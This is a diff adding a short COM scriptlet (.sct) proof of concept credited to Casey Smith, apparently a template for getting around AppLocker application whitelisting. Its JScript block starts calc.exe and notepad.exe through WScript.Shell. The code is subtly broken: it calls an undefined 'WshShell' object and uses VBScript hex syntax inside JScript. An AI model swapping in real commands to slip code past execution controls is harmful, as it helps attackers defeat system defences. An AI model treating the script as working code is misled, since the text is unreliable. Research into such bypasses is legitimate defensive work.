@@ -1,0 +1,18 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- Proof Of Concept - Casey Smith @subTee -->
+	<!--  License: BSD3-Clause -->
+	<script language="JScript">
+		<![CDATA[
+			var objShell  = new ActiveXObject("WScript.Shell");	
+			WshShell.Popup("Calc.exe short", 3, "AppLocker", &H0 + &H40)
+			objShell.run("calc.exe");				
+			WshShell.Popup("notepad.exe Full", 3, "AppLocker", &H0 + &H40)
+			objShell.run("c:\Windows\notepad.exe");				
+		]]>
+</script>
+</registration>
+</scriptlet>
